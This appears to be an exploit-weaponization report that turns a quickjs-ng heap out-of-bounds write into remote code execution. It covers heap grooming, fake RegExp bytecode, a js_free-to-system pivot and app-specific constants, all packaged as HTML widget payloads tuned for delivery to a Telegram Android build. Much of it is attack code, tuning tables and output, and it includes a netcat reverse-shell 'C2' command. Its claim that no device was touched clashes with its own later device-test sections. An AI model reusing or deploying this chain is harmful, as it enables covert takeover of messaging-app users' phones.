# N1 weaponization audit — OOB length corruption → heap leak → full RCE

Date: 2026-11-05
Target: quickjs-ng snapshot at HEAD `e22ce4d` (2026-11-02), the engine source
used by the Telegram Android widget lab (`lab/qjs_src`). Host-only app model:
6 MiB JS heap, 512 KiB stack, 300 ms interrupt, global `eval`, no host APIs.
No phone, no bot, no third-party service.
Lab: `telegramandroidwidget/lab/qjs_n1/`.
This report is the only N1 weaponization write-up; the original bug report is in
`notes/qjs_latest_bughunt.md`. It covers the escalation only, not a duplicate of
N1.

## 0. Result

**Full host RCE, 5/5 deterministic**, from ordinary widget JavaScript under the
6 MiB / 300 ms app model:

```
LEAK=<heap ptr>  ABLEN=1024  VIEW=1024
TRIGGER=23  BL=2046820360
FINAL=AFTER
```

Proof file (`id` + `N1RCE`):

```
uid=1000(user) gid=1000(user) groups=1000(user),20(dialout),24(cdrom),...
N1RCE
```

The chain:

1. **N1** (same bug, escalation only): a fake `JSVarScope` parent chain in the
   class-128 arena block before `fd->scopes` walks `scope_level` to `-11449`;
   `add_scope_var()` writes the 16-bit var index `1024` at
   `scopes + 20*(-11449) + 4`, exactly `JSArrayBuffer.byte_length`.
   `AB.byteLength` becomes 1024 while its data buffer is 64 bytes.
2. The oversized `Uint8Array(AB)` view is used to overwrite a **live RegExp
   bytecode buffer** (class 72, same arena) with the PR #1827 fake bytecode
   program (`capture_count=2`, `register_count=3`, `REOP_set_i32`).
3. `re.exec()` runs the fake program; the capture array (class 64) is allocated
   after a freed `ArrayBuffer(16)`, immediately followed by four
   `ArrayBuffer(72)` victim structs. The fake program writes
   `0x7a000000+8j` into `victim[j].byte_length` (about 2 GB), without the #1827
   UAF.
4. `new BigInt64Array(victim)` gives a huge forward window. The #1827 pivot
   finds a class-29/30 JSObject, pivots its `u.ptr` with one 8-byte store, walks
   `shape → proto → prop → ctor (class 12) → realm = JSContext`,
   `ctx+16 = JSRuntime`, `rt+16 = mf.js_free`, resolves libc `free` through the
   PIE GOT, finds `system` with a GNU-hash ELF resolver, writes
   `rt->mf.js_free = system` and `rt->malloc_state.opaque = cmd`.
5. Freeing a 4 KiB `Uint8Array` calls `system(cmd)`; `/tmp/n1_rce_proof` is
   written.

**Widget port (Telegram 72879):** single-widget loader (body `Ok`, four
`<script type="text/plain">` blocks, `(0,eval)`) with debug/final variants in
`lab/qjs_n1/widget/`.  DB variants: 13,689-14,154 raw / 5,723-5,899 zlib.
Compact bot-size variants: 8,317-8,782 raw / 3,375-3,535 zlib (stage1 is the
runtime-built-source variant and needs device tuning).  The host single-eval
wrapper's stage1 OOM catchability is the remaining porting risk (F2); the debug
markers and the `--probe` catch/free aid are provided.

The earlier primitive results are still valid and are the foundation:
the OOB length corruption (`ABLEN=1024`) and the cross-object OOB read/write
(`OOB_RW_OK buf=15 off=72`). The RCE uses the same N1 bug; no new N1 report.

## 1. N1 reproduction and the ASan macro caveat

```bash
cd lab/qjs_n1
clang -g -O1 -DNDEBUG -D__SANITIZE_ADDRESS__ -fsanitize=address,undefined \
  -fno-omit-frame-pointer -I src harness/app.c \
  src/quickjs.c src/libregexp.c src/libunicode.c src/dtoa.c -lm -o build/asan
```

`-D__SANITIZE_ADDRESS__` is mandatory: clang's `-fsanitize=address` does not
define it, so without it `JS_ARENA_LARGE_BLOCKS_ONLY` stays 0 and the quickjs
4 KiB arena hides intra-arena overflows. With the macro every allocation is
individually ASan-tracked.

Filler **6,165,536** (`poc/poc_n1_asan_oob_write.js`) reproduces the original N1:

```
ERROR: AddressSanitizer: heap-buffer-overflow ... WRITE of size 4
    #0 add_scope_var quickjs.c:24480
    #1 define_var quickjs.c:24677
    #2 js_define_var quickjs.c:26548
    #3 js_parse_statement_or_decl quickjs.c:30044
    #4 js_parse_source_element quickjs.c:33010
    #5 js_parse_program quickjs.c:38081
    #6 __JS_EvalInternal quickjs.c:38294
```

Artifacts: `logs/asan_n1_oob_write.log`, `logs/asan_n1_oob_write.excerpt.txt`.
Scudo build: the same PoC returns `SyntaxError: invalid assignment left-hand
side` in this harness rather than crashing; the release manifestation is
allocator-dependent (the app model uses the quickjs arena for small blocks;
Scudo only sees arena refills/large blocks).

## 2. Layout facts (NDEBUG app build)

* `JSString` is 24 bytes in NDEBUG (`ENABLE_DUMPS`/`link` removed); data at +24.
  Length 88..95 is class 128; length 40..47 is class 72.
* `JSVarScope` is 20 bytes: `parent +0`, `first +4`, flags +8, labels +12/+16.
* Class-128 arena: 4 KiB, 48-byte header, 31 blocks of 128 bytes.
  Class-72 arena: 4 KiB, 48-byte header, 56 blocks of 72 bytes.
* `JSFunctionDef`: `scope_level` 160, `scope_first` 164, `scope_size` 168,
  `scope_count` 172, `scopes` 176, `def_scope_array` 184.
* `JSObject`: shape +24, prop +32, class_id +18, u.array.count +64,
  u.array.u.ptr +56, cfunc.realm +48.
* `JSShape.proto` +48; `JSContext.rt` +16; `JSRuntime.mf.js_free` +16,
  `malloc_state.opaque` +64. `JS_CLASS_C_FUNCTION` = 12,
  BigInt64Array/BigUint64Array JSObjects = 29/30.

For a scopes block at arena index 30, `scopes[-1].parent` is predecessor user
offset 108; a 47-code-unit wide string at that block encodes arbitrary parents.

## 3. Primitive A — fake-parent walk and heap leak

`poc/poc_n1_leak.js` (`BIG1=6,074,000, T1=4140`): 31+23 class-128 fillers,
target `T` (95 chars), Symbol + WeakRef, 4 fillers, fake wide string at block
29; eval with three `try{}catch{}` then `try{}catch(e` (missing `)`).
`FK` encodes parents `-2,-3,-4,-45`. The pops walk `-1..-4 -> -45` and store
`idx=134` into `T.len` (`scopes-896`). The enlarged string reads the Symbol's
`first_weak_ref` at block 24+16 and leaks a `JSWeakRefRecord *`:

```
N1POP ... level=-1 ... scope=-1
...
N1ADD ... level=-45 count=6 size=6 idx=134
              target=0x...94d0
[eval] Error: Error: LEAK=<16 hex> ABLEN=64 VIEW=64
```

## 4. Primitive B — ArrayBuffer byte_length corruption

Second stage re-grooms the class-128 arena, allocates the target
`ArrayBuffer(64)` after the re-groom, and uses one dummy class-64
`ArrayBuffer(1)` to put `byte_length` on the 20-byte grid. With
`BIG2=5,876,128, T2=164,000, TD2=-11449, ND=1`:

```
N1ABUF abuf=0x...4f3a20 len=64
N1ADD ... scopes=0x...52b890 level=-11449 idx=1024
          target=0x...4f3a20
ABUF - scopes = -0x37E70; (-0x37E70 - 4) / 20 = -11449
[eval] Error: Error: LEAK=<ptr> ABLEN=1024 VIEW=1024
```

`poc/poc_n1_ab_len.js` is the working PoC. The 1024-byte view over a 64-byte
data buffer is the arbitrary heap read/write window; `poc/demo_oob.js` +
`harness/app2.c` found and overwrote another ArrayBuffer through it:
`OOB_RW_OK ABLEN=1024 VIEW=1024 buf=15 off=72 tries=1`.

## 5. Path A (cross-arena) — analysis, deprioritized

The class-72 data buffer of `AB` was measured at block 38 of a 56-block arena
(`logs/ab_len_layout.trace`); the 1024-byte view covers blocks 39..52, still
inside the class-72 arena. To reach a class-64/80 arena the data block must be
at block >=42 and the following 4 KiB chunk must be that arena. This needs
block-index grooming and a controlled arena allocation order. Path B achieved
the same arbitrary read/write through same-class data buffers (the RegExp
bytecode and the #1827 capture/victim primitive), so path A was not completed.
This is a prioritization, not a proof that the cross-arena layout is impossible.

The same-class result was already strong: the view found 9-12 class-72 RegExp
bytecode buffers at offsets 72..648 (`logs/demo_re_find.out`), which is what
path B uses.

## 6. Path B — live RegExp bytecode overwrite → PR #1827 → RCE

### 6.1 Fake bytecode

A small RegExp `(a)(b)(c)(d)` compiles to 52-byte bytecode in a class-72 block
(user 64). The fake program fits in 64 bytes:

```
00 00 02 03 00 00 00 00      header: cc=2, rc=3
13 00 14 00                  save_start 0, save_end 0
1b 04 08 00 00 7a            set_i32 r4, 0x7a000008
1b 0c 10 00 00 7a            set_i32 r12, 0x7a000010
10                           match
```

`REOP_set_i32` writes to `capture + 8*(2*cc + pc[0])`; with cc=2 and
`pc[0]=8j-4` the writes are at `capture + 64*j`. `capture` is a 56-byte
class-64 allocation.

### 6.2 Trigger

`poc/trigger_re.js` (run after `poc_n1_ab_len.js` in the same runtime):

1. Drain class 64 with 4000 live `new ArrayBuffer(16)`.
2. Allocate 24 RegExps; scan the 1024-byte N1 view for the bytecode header; the
   visible class-72 buffers are at view offsets 72,144,...,648. Overwrite each
   with the fake program.
3. For each regexp (from index 23 down), set up
   `tmpAb = new ArrayBuffer(16)`, then four
   `padA {} / victim ArrayBuffer(72) / padB {}` triples; `lastIndex` is an
   object whose `valueOf` frees `tmpAb`. `exec()` allocates the capture at
   `tmpAb`'s class-64 block; the fake program writes at capture+64 and +128,
   i.e. victim[0]/victim[1] structs.
4. `TRIGGER=23 BL=2046820360` (0x7A000008) in 5/5 runs.

### 6.3 Pivot and endgame

`poc/demo_endgame.js` (same runtime; run via `build/app3`):

* For each corrupted victim, `new BigInt64Array(victim)` has a ~2 GB count and
  `u.ptr = D` (the victim's 72-byte data buffer, class 80). Free `padA`, create
  `va`; free `padB`, create `vb`; one of the two JSObjects (class 29/30) is
  forward of `D`.
* Scan up to 8 KiB for class 29/30 and the victim count at +64; read `u.ptr` at
  +56; pivot with one 8-byte store at `D+k+56` (the view's own `u.ptr`).
* Prototype chain: `shape = D+k+24`, `proto = shape+48`, `prop = proto+32`,
  find a C_FUNCTION (class 12) constructor, `ctx = ctor+48`, `rt = ctx+16`,
  `js_free = rt+16`.
* `pieBase = js_free - JS_DEF_FREE`; `free = *(pieBase + FREE_GOT)` (libc);
  GNU-hash/SysV ELF resolver finds `system`.
* Confirmed trace (`logs/demo_endgame_dbg.out`):

```
DBG jsfree=0x...dae0 pie2=0x...8000
DBG got=0x7f...dfc0 libcfree=0x7f...dfc0
DBG elf=0x7f...b000 dyn=... str=... sym=... gnu=...
DBG findsym=0x7f...e090 sys=0x7f...e090
HOOKED
AFTER
```

* Write `rt->mf.js_free = system`, `rt->malloc_state.opaque = cmd`; free `BIG`
  (4 KiB `Uint8Array`) → `system(cmd)`.

Host constants for the checked-in `build/app3` binary:

```
JS_DEF_FREE = 0x45ae0
FREE_GOT    = 0x109008
SYSTEM_DELTA = -0x4ff30   (fallback only; the ELF resolver is primary)
```

### 6.4 Reproduction

```bash
cd lab/qjs_n1
./build/app3 poc/poc_n1_ab_len.js poc/trigger_re.js poc/demo_endgame.js
cat /tmp/n1_rce_proof
# uid=...  N1RCE
```

`logs/n1_rce_full.out`, `logs/n1_rce_5x.txt`, `logs/n1_rce_proof.txt`.
5/5 consecutive runs wrote the proof.

## 7. App deployment caveats

The RCE is host-only. The chain reuses the #1827 endgame already deployed on
the app (same `rt->mf.js_free = system` and ELF resolver), but for an Android
build the constants and heap phase must be re-derived:

* `JS_DEF_FREE`/`FREE_GOT` depend on the app binary; `system - free` depends on
  the bionic libc version (the existing #1827 payloads use the app-72799
  constants and a fallback delta).
* The trigger needs the class-64 free-list phase (`FILL64=4000`) and the
  class-72 view offsets to match the app's 8 MiB/6 MiB heap and Scudo layout.
* MTE (Pixel 9) tags the OOB write to the RegExp bytecode buffer and the class-64
  victim structs; the N1 view write would be tag-checked and can trap. The
  existing #1827 device payloads were validated on a non-MTE Sony; the N1
  escalation has not been run on a device and is not claimed there.
* The 300 ms CPU budget: the host chain runs well under it; the app number is
  unmeasured.

## 8. Widget port (Telegram 72879)

Host-only preparation; no device or bot was touched.

### 8.1 Loader and eval structure

`lab/qjs_n1/widget/n1_debug_72879.html` / `n1_final_72879.html`:

```html
<!doctype html><body>Ok
<script type="text/plain" id="p">WRAPPER</script>
<script type="text/plain" id="s1">STAGE1</script>
<script type="text/plain" id="s2">STAGE2</script>
<script type="text/plain" id="s3">STAGE3</script>
<script>var s=document.getElementById("p").textContent;(0,eval)(s);setTimeout(function(){},10000)</script>
```

The wrapper (debug variant) is:

```js
mark("START");
try{ eval(document.getElementById("s1").textContent); }catch(e){ mark("E1"); }
big2=null; tune2=null; tune3=null; src1=null; src2=null;
mark("S1"); try{ mark("ABLEN="+AB.byteLength); }catch(e){ mark("NO_AB"); }
try{ eval(document.getElementById("s2").textContent); }catch(e){ mark("E2"); }
try{ eval(document.getElementById("s3").textContent); }catch(e){ mark("E3"); }
mark("END");
```

Stage1 is the original `poc_n1_ab_len.js` (N1 AB length + leak); stage2 is
`trigger_re.js` (RegExp bytecode overwrite + class-64 victim trigger); stage3 is
`demo_endgame.js` (#1827 pivot + ctx + `js_free=system`).  Stage sources are in
separate `text/plain` blocks, read lazily by `textContent`, so only one stage
source is a live JS string at a time.

**Structural verification** (`harness/app_stage.c`, `__stage(i)` returns the
stage text on demand; low-filler stage1 so the AB stage returns normally):

```
MARKS=START|E1|GLOBALS=object,string,undefined|S1|ABLEN=64|E2|E3|END
```

This confirms the stage1 throw is caught, `AB`/`big2`/`tune2` survive the
catch, the free line runs, and stage2/stage3 are evaluated in the same runtime.
The full single-eval chain at the host tuning (`FILL1=6,074,000, T2=164,000`)
aborts before the AB assignment: the marks are
`START|E1|GLOBALS=undefined,undefined,undefined|S1|NO_AB|E2|E3|END`, so the AB
stage never runs.  The three-file `app3` chain is the host-verified reference
(5/5 RCE).  The single-eval wrapper's outer stage strings/heap base shift the
filler window; lower `FILL1`/`T2`, the compact stage1, and the F2 probe/retry
are the adaptations.  The F2 finding (`notes/audit_regexp_postfix.md`) also
shows that OOM catchability depends on whether the heap is dominated by a
large filler or by small live objects; the `--probe` fill is the tuning aid.

### 8.2 OOM probe / retry aid

`lab/gen_widget.py --probe N` inserts a class-80 fill immediately before the
stage1 AB eval and drops it after the catch:

```js
var PROBE=[]; try{ for(var i=0;i<N;i++) PROBE.push({}); }catch(e){}
try{ eval(src2); }catch(e){}
PROBE=null;
```

The intent (from the F2 finding in `notes/audit_regexp_postfix.md`) is to
exhaust the class-80 free lists so the OOM error object cannot be allocated and
the OOM arrives as a catchable bare `null`; the stage1's own catch then works.
`N` is a tuning knob, swept together with `T2`/`T3`; it is not enabled by
default in the delivered variants.

### 8.3 App 72879 constants and commands

* `JS_DEF_FREE=0x174926c`, `FREE_GOT=0x196fef0` (app 72879).
* `SYSTEM_DELTA=0x26df0` is a fallback only; the endgame's GNU/SysV ELF
  resolver resolves `system` from the runtime libc `free` pointer first.
* Debug command: `id > /data/user/0/org.telegram.messenger.beta/cache/n1_proof`
  (60 bytes).
* Final C2: `setsid sh -c 'sleep 2|nc <LAN_IP> 4445|sh' &` (49 bytes).
* The command is written into the victim's 72-byte data buffer; the limit is
  71 bytes + NUL.  Both commands fit.  A longer absolute-path command needs a
  separate command buffer (e.g. the 4 KiB `TRIG` buffer) and a second pivot; it
  is not used here.  On Android, `nc` may need `/system/bin/toybox nc`; if the
  short name is not in PATH, use the toybox form only if it still fits.

### 8.4 Variants and sizes

| file | stage1 | raw | zlib | use |
|---|---|---|---|---|
| `n1_debug_72879.html` | verified original | 14,154 | 5,899 | device tuning (markers) |
| `n1_final_72879.html` | verified original | 13,689 | 5,723 | DB delivery |
| `n1_debug_72879_raw.html` | verified original | 17,897 | 6,911 | patchable source |
| `n1_debug_72879_bot.html` | compact runtime-built | 8,782 | 3,535 | bot-size, tuning required |
| `n1_final_72879_bot.html` | compact runtime-built | 8,317 | 3,375 | bot-size, tuning required |

The compact stage1 builds the 1023 identifier source strings at runtime
(`lab/gen_stage1_widget.py`), cutting the stage from 7.4 KiB to 2.1 KiB.  Its
AB/leak logic is identical, but its heap phase differs and it was not tuned to
`ABLEN=1024` on the host; the bot-size variants are therefore **tuning
required**.  The DB variants use the host-verified stage1 and are the
reference.  All raw sizes are < 32 KiB; zlib for the DB variants is > 4 KiB, so
the DB variants are **DB-only** for the 4 KiB bot limit.  The bot-size variants
are < 4 KiB zlib.

Host variants (`n1_debug_host.html`, `n1_final_host.html`) use
`JS_DEF_FREE=0x45940`, `FREE_GOT=0x109008`, `SYSTEM_DELTA=-0x4ff30` and the
host `/tmp` proof.

### 8.5 Tuning parameters and sweep procedure

`lab/gen_widget.py` exposes all of them:

| parameter | host value | meaning |
|---|---|---|
| `--fill1` | 6,074,000 | stage1 big filler; 8 MiB device: add ~2 MiB |
| `--t1` | 4,100 | fine filler tune after `FILL1` |
| `--fill2` | 5,876,128 | AB-stage big filler |
| `--t2` | 164,000 | AB-stage coarse tune (page steps 4096) |
| `--t3` | 0 | AB-stage fine tune (real `ArrayBuffer`; compact stage1 only) |
| `--td2` | -11,449 | ABUF level; `ABUF-scopes=-0x37E70` |
| `--nd` | 1 | class-64 dummy ABs for the 20-byte grid |
| `--fill64` | 4,000 | class-64 drain |
| `--nw` | 2 | fake `REOP_set_i32` writes |
| `--vlo/--vhi` | 64/1024 | RegExp bytecode scan window |
| `--probe` | 0 | class-80 OOM-catchability fill |

Sweep order on the device (debug variant):

1. **S1**: lower `FILL1`/`T1` until stage1 returns and the marker `S1`
   appears.  If it never appears (uncatchable OOM), increase `--probe` or
   reduce the stage1 base; the debug HTML's `#v` div and `console.log` show
   the last marker.
2. **ABLEN**: sweep `T2` in 4096-byte page steps, then `T3` in 16-byte steps
   and `ND` for the grid, until `ABLEN=1024`.  `ABLEN=64` means the AB stage
   missed; an OOM before `S1` means the stage1 free is too low.
3. **TRIGGER**: sweep `FILL64` until `TRIGGER>=0` and `BL` is about
   `0x7A000000`.  `TRIGGER=-1` means the class-64 victim layout missed;
   `FILL64` must drain the device's class-64 free list (Scudo fragmentation).
4. **HOOKED/FINAL**: if `TRIGGER` is good but no `HOOKED`, check
   `JS_DEF_FREE`/`FREE_GOT`/the ELF resolver; the final proof file distinguishes
   a resolver failure from a pivot failure.
5. Rebuild the final variant with the tuned parameters.  Keep the 300 ms
   budget in mind: one stage1 parse is the dominant cost; a retry/probe must
   fit.

### 8.6 Persistent debug (localStorage PREV) and CPU budget

The persistent variants use `localStorage.setItem("N1MARK", s)` in `mark()`
(in addition to DOM/global/console) and stop at load if a previous marker
exists:

```js
var V=document.getElementById("v");
var P=null; try{P=localStorage.getItem("N1MARK");}catch(e){}
if(P){ if(V)V.textContent="PREV="+P; }
else {
  function mark(s){ try{localStorage.setItem("N1MARK",s);}catch(e){}
    try{globalThis.N1MARK=s;}catch(e){}
    try{console.log("N1:"+s);}catch(e){}
    try{if(V)V.textContent=s;}catch(e){} }
  mark("START");
  try{ eval(document.getElementById("s1").textContent); }catch(e){ mark("E1"); }
  big2=null; tune2=null; tune3=null; src1=null; src2=null;
  try{ eval(document.getElementById("s2").textContent); }catch(e){ mark("E2"); }
  try{ eval(document.getElementById("s3").textContent); }catch(e){ mark("E3"); }
  mark("END");
}
```

Stage markers: `S1A` at the top of stage1, `AB_PRE`/`AB_POST` around the
`ArrayBuffer(64)`, `AB_EVAL`/`AB_DONE` around the AB eval, `S1B` before the
stage1 throw; `S2A` at the top of stage2, `S2B TRIGGER=<n> BL=<v>` before its
throw; `S3A` at the top of stage3, `S3:<RESULT>` from `setres` (CTX, HOOKED,
AFTER, NO_*), explicit `HOOKED`, and `S3B FINAL=<RESULT>`.

Reading after a crash/reset: reopen the same widget message (same message id /
storage origin); the loader does not run the stages and `#v` shows
`PREV=<last marker>`.  The expected sequence is:

```
START -> S1A -> AB_PRE -> AB_POST -> AB_EVAL -> AB_DONE -> S1B
      -> S2A -> S2B TRIGGER=... -> S3A -> S3:... -> HOOKED -> S3B FINAL=...
      -> END
```

If `PREV` is `S1A`, stage1 died before the AB allocation; if `AB_EVAL`, it died
in the AB stage; if `S2A`, stage2 died; if `S3A`/`S3:*`, stage3 died.  The
stop-after variants isolate the stages (`s1`, `s1+s2`, full).  Clear with
`n1_persist_clear_72879.html` (`localStorage.removeItem("N1MARK")`) or by
changing the bot message id / clearing the app cache.  If the widget sandbox
does not expose `localStorage`, the writes are silently ignored; `PREV` will
stay empty and only the DOM marker during the run and the proof file remain.

Persistent variants (all body `<div id="v">Ok</div>`, debug proof command):

| file | raw | zlib | stop |
|---|---|---|---|
| `n1_persist_s1_72879.html` | 17,961 | 6,984 | stage1 only |
| `n1_persist_s12_72879.html` | 18,089 | 7,009 | stage1+2 |
| `n1_persist_full_72879.html` | 18,164 | 7,018 | stage1+2+3 |
| `n1_persist_clear_72879.html` | 302 | 222 | clear only |
| `n1_persist_s1_compact_72879.html` | 12,577 | 4,589 | compact stage1 only |

CPU time in the host app model (`build/app` for stage1, `build/app3` for
multi-stage; median of 3, user+sys, empty baseline 0.9 ms):

| case | CPU |
|---|---|
| stage1 only | 28-46 ms |
| stage1+2 | 29-30 ms |
| full chain | 175-180 ms |
| compact stage1 | 30-46 ms |

Stage1 is comfortably below the 300 ms widget budget on the host (about
6-10x margin).  The full chain is under 300 ms on the host but the endgame
(BigInt scans + ELF resolver) is the hotspot (~145 ms), not stage1; a phone
2-4x slower than this host can exceed 300 ms.  If the device debug shows a
timeout/interrupt, reduce `CFG.LIM` (8192 -> 2048), the regexp spray (24 -> 10),
the victim count (4 -> 1), `FILL64` (4000 -> 1000) and the resolver page
range; the compact stage1 reduces the stage1 source/parse but not the endgame.
The `app3` harness resets the 300 ms deadline between files; the widget has a
single 300 ms deadline for the whole payload, so the host full-chain number is
a lower bound.

### 8.7 Risks

* Host-only preparation; no device run.  The 72879 constants are from the
  existing #1827 app analysis; Scudo/8 MiB/300 ms and the app's heap base can
  shift every tuning parameter.
* The single-eval wrapper's OOM catchability is the main porting risk (F2);
  the `--probe` fill is the mitigation to evaluate first on the device.
* Sony XQ-BT52 (the #1827 validation device) is non-MTE.  A Pixel 9 / MTE
  target tags the OOB writes to the RegExp bytecode buffer and the class-64
  victim structs; the N1 view write would be tag-checked and may trap.
* The C2 command uses `nc` from PATH; if the app's PATH lacks it, use the
  absolute `/system/bin/toybox nc` form only if the command still fits in 71
  bytes, otherwise add a command-buffer pivot.
* The bot-size variants are size-optimized but their stage1 phase is not
  host-tuned; the DB variants are the verified reference.

**Superseded for the 8 MiB device:** the `n1_lean8_*` variants in §8.8 use an
8 MiB-tuned stage1 and the lean endgame; they are the current device
candidates.  The 6 MiB files above remain as the host reference.

### 8.8 8 MiB device-profile lean update (2026-11-05)

Host-only; no device or bot was touched.

**Previous device s1 result.** The s1 payload was loaded (`running 1970 ms`)
but produced no proof; reopening the same message gave an empty bubble and no
`PREV`.  The wrapper's `RUN`/`WRAP_OK` DOM markers worked, so the loader and
storage are not the failure.  The likely causes are the 300 ms CPU deadline or
the widget reset, plus a tuning mismatch: the stage1 filler was still the
6 MiB host value while the app heap is 8 MiB / Scudo.  Console output is not
visible in the widget.

**8 MiB stage1 tuning (host proxy).**  Run the host engine with
`QJS_HEAP_LIMIT=8388608`; the same source/layout as the device, only the
system-allocator usable sizes differ.

| parameter | 8 MiB host value | note |
|---|---|---|
| `FILL1` | 8,171,152 | 6,074,000 + 2,097,152 |
| `T1` | **3,800** | not 4,100: the 8 MiB big-string usable size eats ~776 more bytes; 4,100 OOMs the leak parse before idx 134 |
| `FILL2` | **7,971,800 / 7,971,820** | 5,876,128 + 2,095,672 |
| `T2` | 164,000 | unchanged |
| `TD2` | -11,449 | unchanged level |
| `ND` | **2** | one extra class-64 dummy shifts AB by 0x40; residue becomes 0 mod 20 |

Verified at 8 MiB:

```
LEAK=<16 hex> ABLEN=1024 VIEW=1024        (10/10 at FILL2 7,971,800 and 7,971,820)
TRIGGER=23 BL=2046820360 HITS=7
FINAL=AFTER                                (3/3 proof with lean s2/s3)
```

The leak write is `N1ADD level=-45 idx=134 target=scopes-896`; the AB write is
`level=-11449 idx=1024 target=ABUF`.  Boundaries on host: `FILL2=7,971,700`
gives `ABLEN=64` (growth succeeds), `7,971,840` gives `InternalError:
out of memory` (parse dies before the fake pop).  The useful window is 20 bytes.

**CPU (host; `QJS_EXIT_AFTER=1` skips the destructive `js_free=system`
teardown; median of 5, user+sys, empty baseline 0.9 ms).**

| case | CPU (net) | proof |
|---|---|---|
| 8 MiB stage1 (`lab/s8.js`) | 37.7 ms (min 36.7) | - |
| 8 MiB s1-only debug payload | 41.7 ms | - |
| 8 MiB stage1+s2 | 37-38 ms | - |
| 8 MiB full chain (lab lean s2/s3) | 59.0 ms (min 58.1) | 5/5 |
| 8 MiB full chain (exact final widget payload) | 65.3 ms (min 63.3, max 87.2) | 5/5 |

All medians are below the 75 ms host target; 65 ms is about 260 ms on a 4x
phone, inside the 300 ms budget but close.  The single-eval widget uses one
deadline for the whole payload, while `app3` resets the deadline per file, so
the widget number is the relevant one.  The endgame still uses the lean levers:
`LIM=1024`, `PAGES=1024`, GNU hash only, `FILL64=1000`, `NW=2`, `NV=1`,
`RESN=24`, victim `BN=0x100000`.  (`NW=2` is the actual host-verified value:
the generator's `NW=1` replace still targets `var FP=fake(2);` without the
spaces used by `trigger_re.js`, so the value stays 2.  `RESN=24` is required:
`RESN=10` gives `TRIGGER=-1 HITS=0` at 8 MiB.)

**F2 probe — result and decision.**  The F2 small-fill probe works as a
catchability mechanism: at 6 MiB, 20/20 OOMs arrive as bare `null`, 5-16 ms per
cycle, and an AB-only F2 stage1 measured 8.4 ms (vs 28.4 ms for the big-fill
stage1).  It was **not** used in the delivered stage1 because the AB-only F2
layout did not stabilise:

* The scopes 6→9 growth must fail *after* the 1024-var array is allocated.  The
  free window at that point is 20-60 bytes, while the smallest pool free unit
  used by the probe was 64 bytes (31-char string, class 64), so the sweep jumps
  over the window.
* At 6 MiB, `F=1306` grew the scopes to 9 (no fake chain), `F=1308` reached the
  fake pop but the class-128 block before `scopes` was not the fake string
  (`parent=21926`) and crashed.
* At 8 MiB the F2 variant did reach `level=-11449`, but the target was 0x40 off
  the ABUF grid; `ND=2` fixed the grid and immediately OOM'd before idx 1024.
* The big-string stage1 is deterministic and host-verified; the F2 path remains
  experimental in `lab/gen_ab_only.py` / `lab/qjs_regexp_audit/f2_helper.js`.

**8 MiB variants.**

| file | raw | zlib | contents |
|---|---|---|---|
| `n1_lean8_final_72879.html` | 17,495 | 6,759 | app 72879 constants, C2, raw stage1 |
| `n1_lean8_final_host.html` | 17,499 | 6,755 | host constants, proof file |
| `n1_lean8_debug_72879.html` | 18,336 | 7,062 | post-stage1 markers, full chain |
| `n1_lean8_s1_debug_72879.html` | 8,491 | **3,272** | stage1 only, under 4 KiB |

The `_bot` names for the 8 MiB final/debug are byte-identical duplicates (the
8 MiB stage1 is supplied with `--s1file`, so `--compact` does not shrink it).
Only the s1-only debug fits the 4 KiB bot limit; the full 8 MiB final is
DB-only.

`n1_lean8_final_72879.html` was generated without `--minify`.  **Do not
minify stage1:** the exact terser-minified payload OOM'ed at 8 MiB because the
20-byte window moved; the delivered files keep the raw stage1.

**Debug wrapper change.**  Any JS object or string allocated before stage1 —
including a hoisted `function mark`, `V`, or a `localStorage.getItem` read —
shifts the stage1 heap window and breaks `ABLEN=1024`.  The 8 MiB debug wrapper
therefore evaluates stage1 **first** and only then creates `V`, `PREV` and the
`mark` function expression:

```js
try{ eval(document.getElementById("s1").textContent); }catch(e){}
big2=null; tune2=null; tune3=null; src1=null; src2=null;
var V=document.getElementById("v");
var P=null; try{ P=localStorage.getItem("N1MARK"); }catch(e){}
var mark=function(s){ ... localStorage/DOM/global ... };
try{ mark("S1B ABLEN="+AB.byteLength); }catch(e){ mark("S1B_NOAB"); }
try{ if(P) localStorage.setItem("N1PREV",P); }catch(e){}
P=null;
try{ eval(document.getElementById("s2").textContent); }catch(e){ mark("E2"); }
try{ eval(document.getElementById("s3").textContent); }catch(e){ mark("E3"); }
var Q=null; try{ Q=localStorage.getItem("N1PREV"); }catch(e){}
try{ if(Q) V.textContent="PREV="+Q+" | NOW="+globalThis.N1MARK; }catch(e){}
Q=null;
```

`PREV` is read after stage1 but before this run's first mark, stashed in the
native `N1PREV` key, and displayed after the stages.  The transient `P` string
is freed before stage2; the exact marked s2/s3 chain still gives proof 3/3 on
the host.  A timeout leaves the last completed marker in `N1MARK`, which the
next completed run displays as `PREV`.  Stop-on-PREV is dropped for the 8 MiB
debug because the pre-read allocation before stage1 breaks the 20-byte window.
The s1-only variant is the first device test; it shows `S1B ABLEN=<n>` (or
`S1B_NOAB`) and `PREV`.

Exact-payload host checks: the extracted s1 from both 8 MiB debug HTMLs gives
`ABLEN=1024` 3/3 at `QJS_HEAP_LIMIT=8388608`; the marked s2/s3 (created after
s1, as in the wrapper) give `TRIGGER=23`, `HITS=9`, `FINAL=AFTER` and proof
3/3.  The final host twin gives proof 3/3 with the exact unminified payload.

**Superseded 2026-11-05:** the device s1 test proved the actual QuickJS heap
is **6 MiB**, not 8 MiB; the `n1_lean8_*` profile above allocated 8,171,152
bytes and died uncatchably before the first mark.  Use §8.9 / `n1_lean6_*`.

**Next device test.**  Send `n1_lean8_s1_debug_72879.html` (3,272 zlib, fits
the 4 KiB message limit), open it, read `#v` (expected
`S1B ABLEN=1024`), and reopen to see `PREV`.  If `ABLEN=64` or no `S1B`, sweep
`FILL2` around 7,971,800 in 20-40 byte steps (Scudo's large-allocation usable
size can shift the window) and/or `T1` around 3,800, using the s1-only variant.
If `ABLEN=1024`, test `n1_lean8_debug_72879.html` for
`S2B TRIGGER=...`/`HOOKED`/`S3B FINAL=...` and the local proof, then the C2
final.  Do not fall back to the 6 MiB final on this 8 MiB app.

### 8.9 Heap-limit correction and 6 MiB delivery (2026-11-05, after device s1)

The device s1 lean8 test (3,272 zlib) loaded but stayed `Ok` with no marker.
The wrapper marks only after `eval(s1)`, so stage1 never returned.  The cause
is the heap size, not a JS exception: the profile allocated
`'x'.repeat(8,171,152)` against a **6 MiB QuickJS heap**.

**Heap-limit evidence.**

* `notes/twidget_interrupt_re.md` decompiles `twidget_JSInterruptRuntime_ctor`
  at `0x776C30` as `JS_NewRuntime(); JS_SetMemoryLimit(rt, 6291456);` — a
  **6 MiB JS heap**.
* The same notes decompile the JNI `create` at `0x97ead0`: the option struct
